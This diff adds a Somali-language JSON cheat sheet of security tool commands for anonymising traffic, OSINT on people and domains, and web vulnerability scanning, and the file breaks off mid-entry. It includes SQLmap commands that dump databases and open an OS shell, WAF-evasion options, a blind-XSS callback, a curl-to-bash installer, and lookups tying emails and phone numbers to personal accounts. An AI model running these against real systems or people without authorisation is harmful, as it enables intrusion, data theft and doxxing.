@@ -1,0 +1,1725 @@
+{
+  "Anonymity & Privacy (Make Yourself Anonymous)": {
+    "Proxychains": {
+      "installation": "sudo apt install proxychains4 -y",
+      "commands": [
+        {
+          "command": "proxychains <command_or_tool>",
+          "description": "Marinta taraafikada aalad kasta dhexda TOR ama Proxies si IP-gaaga dhabta ah loo qariyo."
+        },
+        {
+          "command": "nano /etc/proxychains4.conf",
+          "description": "Faylka qaabeynta Proxychains halkaas oo lagu doorto dynamic_chain ama strict_chain."
+        },
+        {
+          "command": "proxychains curl ifconfig.me",
+          "description": "Hubinta IP Address-ka uu Proxychains hadda muujinayo si loo xaqiijiyo in IP-gii dhabta ahaa qarsoomay."
+        },
+        {
+          "command": "proxychains nmap -sT -PN -p 80,443 <target_ip>",
+          "description": "Port scanning qarsoon oo dhex maraya Tor/Proxychains (TCP Connect Scan)."
+        },
+        {
+          "command": "proxychains firefox &",
+          "description": "Kicinta browser-ka Firefox isagoo taraafikadiisa oo dhan marinaya proxychains."
+        },
+        {
+          "command": "proxychains git clone <repo_url>",
+          "description": "Soo dejinta koodhka GitHub adigoo qarinaya IP-gaaga dhabta ah."
+        },
+        {
+          "command": "proxychains wget -c <download_link>",
+          "description": "Fayl soo degsasho ammaan ah oo qarsoon."
+        },
+        {
+          "command": "proxychains -q <command>",
+          "description": "Kicinta amarka adoon daaqadda ku soo bandhigin qoraalka xiriirka proxy-ga (Quiet Mode)."
+        },
+        {
+          "command": "proxychains python3 <script.py>",
+          "description": "Kicinta script Python ah isagoo taraafikadiisa marinaya proxy."
+        },
+        {
+          "command": "tail -n 20 /etc/proxychains4.conf",
+          "description": "Akhrinta 20-ka khad ee ugu dambeeya ee liiska proxies-ka ku qoran."
+        }
+      ]
+    },
+    "Tor Service": {
+      "installation": "sudo apt install tor -y",
+      "commands": [
+        {
+          "command": "sudo systemctl start tor",
+          "description": "Kicinta adeegga TOR si loo furo SOCKS5 proxy dakadda 127.0.0.1:9050."
+        },
+        {
+          "command": "sudo systemctl status tor",
+          "description": "Hubinta in adeegga Tor uu si nabad ah u shaqaynayo."
+        },
+        {
+          "command": "sudo systemctl restart tor",
+          "description": "Dib u bilaabista adeegga TOR si loo helo circuit iyo IP cusub."
+        },
+        {
+          "command": "sudo systemctl stop tor",
+          "description": "Joojinta adeegga TOR."
+        },
+        {
+          "command": "curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip",
+          "description": "Hubinta in xiriirkaagu si toos ah u dhex marayo shabakadda TOR."
+        },
+        {
+          "command": "curl --socks5-hostname 127.0.0.1:9050 http://<onion_address>.onion",
+          "description": "Furista website .onion ah iyadoo DNS-ka laftiisa la marinayo Tor."
+        },
+        {
+          "command": "ss -tulpn | grep 9050",
+          "description": "Hubinta in dakadda 9050 (Tor SOCKS Port) ay furan tahay oo dhegeysanayso."
+        },
+        {
+          "command": "sudo killall -HUP tor",
+          "description": "U dirista signal Tor si uu markiiba u beddelo identity-ga iyo exit node-ka."
+        },
+        {
+          "command": "torify <command>",
+          "description": "Hal amar oo amarka aad rabto ku qasbaya inuu Tor dhex maro."
+        },
+        {
+          "command": "sudo journalctl -u tor -n 50",
+          "description": "Akhrinta diiwaanka xogta (logs) ee adeegga Tor."
+        }
+      ]
+    },
+    "Macchanger": {
+      "installation": "sudo apt install macchanger -y",
+      "commands": [
+        {
+          "command": "sudo macchanger -r <interface_name>",
+          "description": "U beddelista MAC Address-ka mid Random ah si aan aaladdaada loo aqoonsan."
+        },
+        {
+          "command": "sudo macchanger -s <interface_name>",
+          "description": "Muujinta MAC Address-ka hadda jira iyo kan asalka ah ee qalabka."
+        },
+        {
+          "command": "sudo macchanger -p <interface_name>",
+          "description": "Dib ugu celinta MAC Address-ka asalkiisi hore ee warshadda (Permanent MAC)."
+        },
+        {
+          "command": "sudo macchanger -m XX:XX:XX:XX:XX:XX <interface_name>",
+          "description": "U dejinta MAC Address gaar ah oo aad adigu gacanta ku qoratay."
+        },
+        {
+          "command": "sudo macchanger -a <interface_name>",
+          "description": "U dejinta MAC address random ah oo ka tirsan isla shirkadda qalabka samaysay."
+        },
+        {
+          "command": "sudo macchanger -l",
+          "description": "Liiska dhammaan shirkadaha samaysta qalabka shabakadaha iyo MAC prefixes-kooda."
+        },
+        {
+          "command": "sudo ifconfig <interface_name> down",
+          "description": "Dami interface-ka shabakadda ka hor inta aadan beddelin MAC-ga."
+        },
+        {
+          "command": "sudo ifconfig <interface_name> up",
+          "description": "Dib u shid interface-ka shabakadda kadib beddelista MAC-ga."
+        },
+        {
+          "command": "ip link show <interface_name>",
+          "description": "Hubinta MAC Address-ka hadda nidaamku u aqoonsan yahay qalabka."
+        },
+        {
+          "command": "sudo macchanger -b -r <interface_name>",
+          "description": "Randomly beddel MAC address-ka adigoo iska dhigaya aalad kale."
+        }
+      ]
+    },
+    "Anonsurf": {
+      "installation": "git clone https://github.com/Und3rf10w/kali-anonsurf.git && cd kali-anonsurf && sudo ./installer.sh",
+      "commands": [
+        {
+          "command": "sudo anonsurf start",
+          "description": "U wareejinta dhammaan taraafikada nidaamkaaga oo dhan (System-wide) dhexda shabakadda TOR adigoo hal amar isticmaalaya."
+        },
+        {
+          "command": "sudo anonsurf changeid",
+          "description": "Beddelista aqoonsiga TOR iyo helitaanka IP cusub isla goobta (New Identity)."
+        },
+        {
+          "command": "sudo anonsurf stop",
+          "description": "Joojinta Anonsurf iyo dib ugu soo celinta nidaamka xiriirka caadiga ah."
+        },
+        {
+          "command": "sudo anonsurf status",
+          "description": "Hubinta xaaladda Anonsurf iyo haddii taraafikadu si buuxda u qarsoon tahay."
+        },
+        {
+          "command": "sudo anonsurf myip",
+          "description": "Soo saarista IP Address-ka qarsoon ee TOR ku siiyay."
+        },
+        {
+          "command": "sudo anonsurf restart",
+          "description": "Dib u bilaabista Anonsurf si loo xalliyo xiriirka."
+        }
+      ]
+    },
+    "DNS Leak & Encrypted DNS (DNSCrypt)": {
+      "installation": "sudo apt install dnscrypt-proxy -y",
+      "commands": [
+        {
+          "command": "sudo systemctl start dnscrypt-proxy",
+          "description": "Sir-qarinta (Encryption) dhammaan weydiimaha DNS si aan shirkadda internet-ka (ISP) u arkin dhaqdhaqaaqaaga."
+        },
+        {
+          "command": "sudo systemctl status dnscrypt-proxy",
+          "description": "Hubinta in adeegga DNSCrypt uu si toos ah u shaqaynayo."
+        },
+        {
+          "command": "resolvectl status",
+          "description": "Hubinta DNS server-yada hadda firfircoon iyo xaqiijinta inaysan jirin wax DNS Leaks ah."
+        },
+        {
+          "command": "cat /etc/resolv.conf",
+          "description": "Akhrinta faylka nidaamka ee qeexaya DNS servers-ka aad isticmaalayso."
+        },
+        {
+          "command": "sudo systemctl restart dnscrypt-proxy",
+          "description": "Dib u bilaabista adeegga DNS sir-qorista."
+        }
+      ]
+    }
+  },
+  "Reconnaissance & OSINT": {
+    "theHarvester": {
+      "installation": "sudo apt install theharvester -y   (ama: pip install theHarvester)",
+      "commands": [
+        {
+          "command": "theHarvester -d <target_domain> -b all -l 500",
+          "description": "Soo ururinta dhammaan emails, subdomains, iyo shaqaalaha adigoo adeegsanaya search engines-ka oo dhan."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b linkedin",
+          "description": "Baarista iyo soo saarista xogta shaqaalaha shirkadda ee ku jira LinkedIn."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b google -l 200",
+          "description": "Xog ururinta passive OSINT adigoo Google Search kaliya isticmaalaya."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b bing,duckduckgo",
+          "description": "Baarista Bing iyo DuckDuckGo si loo helo xog dheraad ah."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b shodan",
+          "description": "Baarista Shodan engine si loo ogaado adeegyada furan ee domain-ka."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b all -f osint_report",
+          "description": "Natiijada oo lagu keydiyo faylasha XML iyo HTML report."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b crtsh",
+          "description": "Baarista Certificate Transparency Logs si loo helo subdomains qarsoon."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b dnsdumpster",
+          "description": "DNSDumpster OSINT query si loo helo khariidadda DNS-ka domain-ka."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b all -v",
+          "description": "Baarista virtual hosts (VHosts) ee ku xiran isla server-ka."
+        },
+        {
+          "command": "theHarvester -d <target_domain> -b all -e 1.1.1.1",
+          "description": "U isticmaal Cloudflare DNS (1.1.1.1) baaritaanka DNS lookup-ka."
+        }
+      ]
+    },
+    "Sherlock": {
+      "installation": "pip install sherlock-project   (ama: git clone https://github.com/sherlock-project/sherlock.git)",
+      "commands": [
+        {
+          "command": "sherlock <target_username>",
+          "description": "Raadinta username-ka qofka in ka badan 350+ baraha bulshada iyo website-yada adduunka."
+        },
+        {
+          "command": "sherlock <user1> <user2> <user3>",
+          "description": "Raadinta dhowr usernames isku mar hal baaris gudaheed."
+        },
+        {
+          "command": "sherlock <target_username> --csv",
+          "description": "Raadinta username-ka iyo natiijada oo lagu keydiyo fayl CSV ah."
+        },
+        {
+          "command": "sherlock <target_username> --xlsx",
+          "description": "Natiijada oo lagu keydiyo fayl Excel ah (.xlsx)."
+        },
+        {
+          "command": "sherlock <target_username> --tor",
+          "description": "Raadinta qofka iyadoo taraafikada oo dhan la dhex marinayo shabakadda TOR."
+        },
+        {
+          "command": "sherlock <target_username> --folderoutput <folder_path>",
+          "description": "U door galka aad rabto in warbixinta lagu keydiyo."
+        },
+        {
+          "command": "sherlock <target_username> --timeout 5",
+          "description": "U deji 5 ilbiriqsi xadka sugitaanka website kasta si uu u dheereeyo."
+        },
+        {
+          "command": "sherlock <target_username> --print-found",
+          "description": "Soo bandhig kaliya accounts-ka la helay (qari kuwa aan la helin)."
+        },
+        {
+          "command": "sherlock <target_username> --nsfw",
+          "description": "Ku dar baaritaanka website-yada dadka waaweyn (Adult/NSFW sites)."
+        },
+        {
+          "command": "sherlock --version",
+          "description": "Hubinta nooca Sherlock ee kombiyuutarkaaga ku jira."
+        }
+      ]
+    },
+    "Subfinder": {
+      "installation": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest   (ama: sudo apt install subfinder -y)",
+      "commands": [
+        {
+          "command": "subfinder -d <target_domain> -silent",
+          "description": "Helitaanka dhammaan subdomain-yada domain gaar ah iyadoo la adeegsanayo passive OSINT degdeg ah."
+        },
+        {
+          "command": "subfinder -d <target_domain> -o subdomains.txt",
+          "description": "Baarista iyo ku qorista dhammaan subdomain-yada fayl qoraal ah."
+        },
+        {
+          "command": "subfinder -dL domains_list.txt -o all_subs.txt",
+          "description": "Baarista subdomain-yada dhowr domains oo ku jira faylka domains_list.txt."
+        },
+        {
+          "command": "subfinder -d <target_domain> -all",
+          "description": "Isticmaal dhammaan ilaha OSINT-ka (Sources) xitaa kuwa gaabiska ah si xog buuxda loo helo."
+        },
+        {
+          "command": "subfinder -d <target_domain> -t 50",
+          "description": "U deji 50 threads si xawaaraha baaritaanka loo kordhiyo."
+        },
+        {
+          "command": "subfinder -d <target_domain> -oJ -o results.json",
+          "description": "Natiijada oo lagu dhoofiyo qaab JSON ah."
+        },
+        {
+          "command": "subfinder -d <target_domain> -sources shodan,censys,virustotal",
+          "description": "Dooro ilo gaar ah oo aad rabto in baaritaanka laga sameeyo."
+        },
+        {
+          "command": "subfinder -d <target_domain> -exclude-sources archiveis",
+          "description": "Ka reeb ilo gaar ah oo aadan rabin inaad isticmaasho."
+        },
+        {
+          "command": "subfinder -d <target_domain> -cs",
+          "description": "Muuji magaca ilaha (source name) laga helay subdomain kasta."
+        },
+        {
+          "command": "subfinder -d <target_domain> | httpx -silent",
+          "description": "Ku xir natiijada Subfinder aaladda HTTPX si loo ogaado kuwa shidan (Live HTTP)."
+        }
+      ]
+    },
+    "PhoneInfoga": {
+      "installation": "curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash   (ama Docker: docker run -it sundowndev/phoneinfoga)",
+      "commands": [
+        {
+          "command": "./phoneinfoga scan -n +<country_code><phone_number>",
+          "description": "Baaritaan OSINT ah oo lagu samaynayo lambar taleefan (dalka, shirkadda isgaarsiinta, carrier, line type)."
+        },
+        {
+          "command": "./phoneinfoga serve -p 8080",
+          "description": "Kicinta Web GUI-ga PhoneInfoga si toos ah browser-ka loogu baaro lambarada taleefannada."
+        },
+        {
+          "command": "./phoneinfoga scan -n +<country_code><phone_number> -s numverify",
+          "description": "Baarista lambarka iyadoo la adeegsanayo scanner-ka Numverify API."
+        },
+        {
+          "command": "./phoneinfoga scan -n +<country_code><phone_number> -s googlesearch",
+          "description": "Baarista Google Dorks ee tooska ah ee la xiriira lambarka taleefanka."
+        },
+        {
+          "command": "./phoneinfoga scan -n +<country_code><phone_number> -s ovh",
+          "description": "Baarista OVH database ee aqoonsiga taleefanka."
+        },
+        {
+          "command": "./phoneinfoga version",
+          "description": "Hubinta nooca PhoneInfoga ee ku shubtay."
+        }
+      ]
+    },
+    "Holehe": {
+      "installation": "pip install holehe",
+      "commands": [
+        {
+          "command": "holehe <target_email@example.com>",
+          "description": "Baarista in email-ka lala xiriiriyay account-no ku yaalla in ka badan 120+ website (Twitter, Instagram, GitHub, Spotify, iwm.)."
+        },
+        {
+          "command": "holehe <target_email> --only-used",
+          "description": "Soo bandhigidda kaliya website-yada uu email-ku account ku leeyahay (used accounts only)."
+        },
+        {
+          "command": "holehe <target_email> --no-color",
+          "description": "Orodka baaritaanka adoon adeegsan midabbo."
+        },
+        {
+          "command": "holehe <target_email> --csv output.csv",
+          "description": "Ku keydinta dhammaan natiijooyinka la helo fayl CSV ah."
+        },
+        {
+          "command": "holehe <target_email> --timeout 10",
+          "description": "U deji 10 ilbiriqsi xadka sugitaanka website kasta."
+        }
+      ]
+    },
+    "Ignorant": {
+      "installation": "pip install ignorant",
+      "commands": [
+        {
+          "command": "ignorant +<country_code><phone_number>",
+          "description": "OSINT taleefan oo lagu ogaanayo in lambarku ku xiran yahay accounts sida Amazon, Instagram, Snapchat, iyo WhatsApp."
+        },
+        {
+          "command": "ignorant +<country_code><phone_number> --tor",
+          "description": "Baarista lambarka iyadoo taraafikada la marinayo TOR Proxy."
+        },
+        {
+          "command": "ignorant --help",
+          "description": "Muujinta dhammaan dookhyada iyo options-ka Ignorant."
+        }
+      ]
+    },
+    "WhatWeb": {
+      "installation": "sudo apt install whatweb -y",
+      "commands": [
+        {
+          "command": "whatweb -a 3 http://<target_url>",
+          "description": "Baaritaan qoto dheer oo lagu ogaanayo teknoolojiyada website-ka (CMS, Web Server, Frameworks, JavaScript)."
+        },
+        {
+          "command": "whatweb -a 1 http://<target_url>",
+          "description": "Stealth/Passive scan ah oo aan wax raad ah kaga tegin log-ga server-ka."
+        },
+        {
+          "command": "whatweb --input-file urls.txt",
+          "description": "Baarista teknoolojiyada dhowr website oo ku jira faylka urls.txt."
+        },
+        {
+          "command": "whatweb http://<target_url> --log-json whatweb_results.json",
+          "description": "Ku keydinta natiijada baaritaanka fayl JSON ah."
+        },
+        {
+          "command": "whatweb http://<target_url> -p IP,HTTPServer,Title",
+          "description": "Soo saar kaliya plugins-ka cayiman (IP, Server type, Page title)."
+        }
+      ]
+    },
+    "Amass": {
+      "installation": "sudo apt install amass -y   (ama: go install -v github.com/owasp-amass/amass/v4/...@master)",
+      "commands": [
+        {
+          "command": "amass enum -d <target_domain>",
+          "description": "OSINT qoto dheer oo lagu khariidaynayo dhammaan subdomains-ka iyo DNS assets ee domain-ka."
+        },
+        {
+          "command": "amass intel -org \"<Target Company>\"",
+          "description": "Helitaanka dhammaan IP blocks (ASN numbers) iyo domain-yada ay leedahay shirkaddu."
+        },
+        {
+          "command": "amass enum -passive -d <target_domain>",
+          "description": "Passive enumeration kaliya adoon toos u taaban server-ka bartilmaameedka."
+        },
+        {
+          "command": "amass enum -active -d <target_domain> -p 80,443",
+          "description": "Active enumeration oo hubinaya dakadaha 80 iyo 443."
+        },
+        {
+          "command": "amass db -names -d <target_domain>",
+          "description": "Akhrinta dhammaan magacyada lagu keydiyay database-ka gudaha ee Amass."
+        },
+        {
+          "command": "amass viz -d3 -d <target_domain>",
+          "description": "Soo saarista khariidad interactive HTML D3 Graph ah oo ku saabsan shabakadda domain-ka."
+        }
+      ]
+    },
+    "SpiderFoot": {
+      "installation": "git clone https://github.com/smicallef/spiderfoot.git && cd spiderfoot && pip install -r requirements.txt",
+      "commands": [
+        {
+          "command": "python3 sf.py -l 127.0.0.1:5001",
+          "description": "Kicinta daaqadda Web GUI ee SpiderFoot si toos ah loogu sameeyo OSINT ballaaran oo automated ah."
+        },
+        {
+          "command": "python3 sf.py -s <target_domain> -m all -o csv",
+          "description": "Orodka dhammaan OSINT modules-ka SpiderFoot iyo natiijada oo CSV lagu keydiyo."
+        },
+        {
+          "command": "python3 sf.py -s <target_domain> -t DOMAIN_NAME -u all",
+          "description": "Baarista dhammaan noocyada xogta ee domain gaar ah (All use-cases)."
+        },
+        {
+          "command": "python3 sf.py -s <target_ip> -t IP_ADDRESS -m sfp_shodan,sfp_whois",
+          "description": "Baarista IP adigoo isticmaalaya modules-ka Shodan iyo Whois."
+        },
+        {
+          "command": "python3 sf.py -M",
+          "description": "Liiska dhammaan modules-ka OSINT-ka ee SpiderFoot taageero."
+        }
+      ]
+    },
+    "Recon-ng": {
+      "installation": "sudo apt install recon-ng -y   (ama: git clone https://github.com/lanmaster53/recon-ng.git)",
+      "commands": [
+        {
+          "command": "recon-ng",
+          "description": "Kicinta qeybta maamulka ee Recon-ng OSINT Framework."
+        },
+        {
+          "command": "marketplace install all",
+          "description": "Ku shubashada dhammaan modules-ka xog ururinta ee ku jira Recon-ng."
+        },
+        {
+          "command": "modules load recon/domains-hosts/bing_domain_web",
+          "description": "Kicinta module-ka Bing si loo helo subdomains-ka cusub."
+        },
+        {
+          "command": "workspaces create <target_project>",
+          "description": "Abuurista workspace gaar ah oo lagu ururiyo xogta baaritaanka."
+        },
+        {
+          "command": "show hosts",
+          "description": "Muujinta dhammaan hosts-ka iyo IP-yada lagu soo ururiyay database-ka."
+        }
+      ]
+    },
+    "Whois & Dig": {
+      "installation": "sudo apt install whois dnsutils -y",
+      "commands": [
+        {
+          "command": "whois <domain.com>",
+          "description": "Helitaanka xogta lahaanshaha domain-ka, shirkadda diiwaangelisay (registrar), iyo magacyada server-yada."
+        },
+        {
+          "command": "dig <domain.com> ANY +noall +answer",
+          "description": "Soo saarista dhammaan DNS Records (A, MX, TXT, CNAME, NS) ee domain-ka."
+        },
+        {
+          "command": "dig <domain.com> +trace",
+          "description": "Raadraaca buuxda ee xiriirka DNS laga bilaabo Root Servers ilaa Authoritative Server."
+        },
+        {
+          "command": "dig -x <target_ip>",
+          "description": "Reverse DNS Lookup: Ogaanshaha magaca domain-ka ee ku xiran IP gaar ah."
+        },
+        {
+          "command": "dig @8.8.8.8 <domain.com> MX",
+          "description": "Ogaanshaha Mail Servers-ka (MX Records) domain-ka adigoo Google DNS adeegsanaya."
+        }
+      ]
+    }
+  },
+  "Web Vulnerability Scanning & Auditing": {
+    "Nuclei (Vulnerability Scanner)": {
+      "installation": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest   (ama: sudo apt install nuclei -y)",
+      "commands": [
+        {
+          "command": "nuclei -u http://<target_url>",
+          "description": "Baaritaan guud oo ku saleysan kumanaan templates oo lagu ogaanayo nuglaanta web-ka."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -t cves/ -severity critical,high",
+          "description": "Baarista kaliya dayac-baylaha heerka sare ah (Critical/High CVEs)."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -t vulnerabilities/ -t exposures/",
+          "description": "Baarista cilladaha amniga iyo xogta sirta ah ee bannaanka u taal (Data Exposures)."
+        },
+        {
+          "command": "nuclei -list urls.txt -t cves/ -o results.txt",
+          "description": "Baarista dhowr website oo ku jira faylka urls.txt iyo natiijada oo lagu keydiyo fayl."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -tags xss,sqli,rce,lfi",
+          "description": "Baarista noocyada ugu waaweyn ee nuglaanta web-ka (XSS, SQLi, RCE, LFI)."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -t misconfiguration/ -t default-logins/",
+          "description": "Baarista khaladaadka qaabeynta server-ka iyo furayaasha asalka ah (Default Credentials)."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -rl 50 -c 25",
+          "description": "U xaddid xawaaraha baaritaanka 50 requests/sec si aan server-ku u damin (Rate Limiting)."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -t technologies/ -silent",
+          "description": "Ogaanshaha dhammaan noocyada software-ka iyo technology stack-ka server-ka."
+        },
+        {
+          "command": "nuclei -ut",
+          "description": "Cusboonaysiinta dhammaan templates-ka Nuclei si loo helo baaritaannada ugu dambeeyay."
+        },
+        {
+          "command": "nuclei -u http://<target_url> -j -o report.json",
+          "description": "Dhoofinta dhammaan natiijooyinka la helo oo qaab JSON ah."
+        }
+      ]
+    },
+    "Nikto (Web Server Scanner)": {
+      "installation": "sudo apt install nikto -y",
+      "commands": [
+        {
+          "command": "nikto -h http://<target_url>",
+          "description": "Baaritaan dhammaystiran oo ku saabsan khaladaadka qaabeynta server-ka web-ka iyo faylalka halista ah."
+        },
+        {
+          "command": "nikto -h http://<target_url> -ssl -p 443",
+          "description": "Baarista server-ka iyadoo la adeegsanayo xiriirka amniga ah ee SSL/TLS (HTTPS)."
+        },
+        {
+          "command": "nikto -h http://<target_url> -Tuning 1,2,3,4",
+          "description": "Tuning scan lagu baarayo kaliya server misconfigurations, information leak, iyo default files."
+        },
+        {
+          "command": "nikto -h http://<target_url> -C all",
+          "description": "Baaritaan CGIs ah oo lagu baarayo dhammaan galalka qoraallada server-ka."
+        },
+        {
+          "command": "nikto -h http://<target_url> -o scan_report.html -Format htm",
+          "description": "Natiijada baaritaanka oo lagu dhoofiyo fayl HTML ah oo aad u qurux badan."
+        },
+        {
+          "command": "nikto -h http://<target_url> -id admin:password",
+          "description": "Baarista server-ka iyadoo la adeegsanayo HTTP Basic Authentication."
+        },
+        {
+          "command": "nikto -h http://<target_url> -useproxy http://127.0.0.1:8080",
+          "description": "Marinta baaritaanka Nikto dhexda Burp Suite ama OWASP ZAP proxy."
+        },
+        {
+          "command": "nikto -h hosts.txt",
+          "description": "Baarista dhowr web servers oo ku jira faylka hosts.txt."
+        },
+        {
+          "command": "nikto -update",
+          "description": "Cusboonaysiinta plugins-ka iyo databases-ka baaritaanka ee Nikto."
+        },
+        {
+          "command": "nikto -h http://<target_url> -Display V",
+          "description": "Soo bandhigidda xogta buuxda (Verbose Mode) ee request kasta oo baxaya."
+        }
+      ]
+    },
+    "SQLmap (SQL Injection Scanner)": {
+      "installation": "sudo apt install sqlmap -y   (ama: pip install sqlmap)",
+      "commands": [
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" --batch --dbs",
+          "description": "Baarista tooska ah ee SQL Injection iyo soo saarista dhammaan databases-ka."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" -D <db_name> --tables",
+          "description": "Soo saarista miisaska (tables) ku dhex jira database-ka la doortay."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" -D <db_name> -T <table_name> --dump",
+          "description": "Soo saarista dhammaan xogta ku dhex jirta miiska la doortay (Dump data)."
+        },
+        {
+          "command": "sqlmap -r request.txt --dbs",
+          "description": "Baarista HTTP request buuxa oo laga soo keydiyay Burp Suite (request.txt)."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/login.php\" --data=\"user=admin&pass=123\" --dbs",
+          "description": "Baarista SQL Injection ee foomamka HTTP POST."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" --level=5 --risk=3 --dbs",
+          "description": "Baaritaanka ugu qotada dheer ee SQLmap (Level 5 Risk 3)."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" --tamper=space2comment,between",
+          "description": "Isticmaalka Tamper scripts si looga gudbo WAF (Web Application Firewall)."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" --current-user --current-db",
+          "description": "Ogaanshaha magaca database user-ka iyo database-ka hadda firfircoon."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" --os-shell",
+          "description": "Isku dayidda furista interactive OS command shell haddii xuquuqdu saamaxdo."
+        },
+        {
+          "command": "sqlmap -u \"http://<target>/item.php?id=1\" --proxy=\"http://127.0.0.1:8080\"",
+          "description": "Marinta taraafikada SQLmap dhexda Burp Suite Proxy."
+        }
+      ]
+    },
+    "Dalfox (XSS Vulnerability Scanner)": {
+      "installation": "go install github.com/hahwul/dalfox/v2@latest   (ama: sudo apt install dalfox -y)",
+      "commands": [
+        {
+          "command": "dalfox url \"http://<target_url>/search?q=test\"",
+          "description": "Baaritaan degdeg ah oo lagu baarayo nuglaanta Cross-Site Scripting (XSS)."
+        },
+        {
+          "command": "dalfox file urls.txt -o xss_results.txt",
+          "description": "Baarista XSS ee dhowr URL oo ku jira fayl iyo keydinta natiijada."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" --blind https://<your_callback>.xss.ht",
+          "description": "Baarista Blind XSS iyadoo la adeegsanayo callback server."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" --cookie \"PHPSESSID=xxxxxx\"",
+          "description": "Baarista XSS adigoo isticmaalaya Session Cookie (Authenticated Scan)."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" --waf-evasion",
+          "description": "Isticmaalka farsamooyinka lagu dhaafo WAF (Firewall Evasion)."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" --custom-payload custom_xss.txt",
+          "description": "Isticmaalka liis gaar ah oo XSS payloads ah."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" --proxy \"http://127.0.0.1:8080\"",
+          "description": "Marinta baaritaanka Dalfox dhexda Burp Suite."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" --format json -o output.json",
+          "description": "Dhoofinta natiijooyinka la helay oo qaab JSON ah."
+        },
+        {
+          "command": "dalfox url \"http://<target_url>/page?id=1\" -w 50",
+          "description": "U kordhi xawaaraha baaritaanka 50 workers."
+        },
+        {
+          "command": "dalfox sxss \"http://<target_url>/post\" --data \"comment=test\"",
+          "description": "Baarista Stored XSS ee foomamka xogta lagu keydiyo."
+        }
+      ]
+    },
+    "Katana (Web Crawler & Spider)": {
+      "installation": "go install github.com/projectdiscovery/katana/cmd/katana@latest",
+      "commands": [
+        {
+          "command": "katana -u http://<target_url>",
+          "description": "Crawling iyo soo saarista dhammaan links-ka, faylalka, iyo endpoints-ka website-ka."
+        },
+        {
+          "command": "katana -u http://<target_url> -d 3 -o endpoints.txt",
+          "description": "Crawling qoto dheer (Depth 3) iyo ku keydinta dhammaan endpoints-ka fayl."
+        },
+        {
+          "command": "katana -u http://<target_url> -js-crawl",
+          "description": "Baarista iyo ka dhex saarista endpoints qarsoon faylalka JavaScript (.js)."
+        },
+        {
+          "command": "katana -u http://<target_url> -headless",
+          "description": "Isticmaalka Headless Chrome browser si loo dhex galo Single Page Apps (React/Vue/Angular)."
+        },
+        {
+          "command": "katana -list urls.txt -o all_endpoints.txt",
+          "description": "Crawling lagu samaynayo liis website-yo ah oo ku jira urls.txt."
+        },
+        {
+          "command": "katana -u http://<target_url> -f qurl",
+          "description": "Soo saarista kaliya URLs-ka leh parameters (e.g. ?id=1) ee ku habboon baaritaanka XSS/SQLi."
+        },
+        {
+          "command": "katana -u http://<target_url> -c 20",
+          "description": "U deji concurrency 20 si uu crawler-ku u noqdo mid aad u dheereeya."
+        },
+        {
+          "command": "katana -u http://<target_url> -proxy http://127.0.0.1:8080",
+          "description": "U dir dhammaan endpoints-ka la helo Burp Suite Proxy."
+        },
+        {
+          "command": "katana -u http://<target_url> -extension js,php,asp,aspx,jsp",
+          "description": "Soo saar kaliya faylalka leh extensions-ka la cayimay."
+        },
+        {
+          "command": "katana -u http://<target_url> | nuclei -t vulnerabilities/",
+          "description": "Ku xir dhammaan endpoints-ka Katana hesho toos aaladda Nuclei si loo baaro."
+        }
+      ]
+    },
+    "Wapiti (Web Application Vulnerability Scanner)": {
+      "installation": "sudo apt install wapiti -y   (ama: pip install wapiti3)",
+      "commands": [
+        {
+          "command": "wapiti -u http://<target_url>",
+          "description": "Black-box vulnerability scan buuxda oo lagu baarayo XSS, SQLi, SSRF, XXE, iyo File Inclusion."
+        },
+        {
+          "command": "wapiti -u http://<target_url> -m xss,sql,exec,file",
+          "description": "Baarista kaliya modules-ka muhiimka ah (XSS, SQLi, Command Exec, File Inclusion)."
+        },
+        {
+          "command": "wapiti -u http://<target_url> -f html -o wapiti_report",
+          "description": "Dhoofinta warbixinta baaritaanka oo qaab HTML interactive ah."
+        },
+        {
+          "command": "wapiti -u http://<target_url> --cookie \"session=xxxx\"",
+          "description": "Baarista website-ka adigoo isticmaalaya authenticated cookie."
+        },
+        {
+          "command": "wapiti -u http://<target_url> --flush-session",
+          "description": "Tirtirida session-kii hore iyo bilaabista baaris gebi ahaanba cusub."
+        },
+        {
+          "command": "wapiti -u http://<target_url> --max-depth 2",
+          "description": "Xaddidida heerka uu crawler-ku hoos u degayo (Depth 2)."
+        },
+        {
+          "command": "wapiti -u http://<target_url> -p http://127.0.0.1:8080",
+          "description": "Marinta weydiimaha Wapiti dhexda HTTP Proxy."
+        },
+        {
+          "command": "wapiti --list-modules",
+          "description": "Liiska dhammaan modules-ka baaritaanka ee Wapiti taageerto."
+        },
+        {
